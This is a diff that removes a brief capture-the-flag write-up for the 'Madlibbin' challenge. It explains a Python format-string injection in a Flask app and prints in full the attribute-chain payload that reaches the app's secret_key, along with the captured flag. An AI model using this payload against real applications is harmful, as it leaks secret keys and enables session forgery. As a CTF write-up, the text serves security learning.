@@ -1,5 +1,0 @@
-Madlibbin
-In the challenge we could insert a template string that will be interpreted in Python's "".format(args=request.args) function. So the string {args} will return ImmutableMultiDict([]). The goal was to read app.secret_key value. 
-By running the server locally and using the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py, I found out the chain of properties that led to Flask.app object {args.__class__.__weakref__.__objclass__._iter_hashitems.__globals__[__loader__].__class__.__weakref__.__objclass__.get_data.__globals__[__loader__].exec_module.__globals__[__builtins__][__build_class__].__self__.copyright.__class__._Printer__setup.__globals__[sys].modules[flask].current_app.secret_key}.
-And the flag is: actf{traversedtheworldandthesevenseas}
-Solving script: ./Madlibbin/app.py $ python3 -m flask run
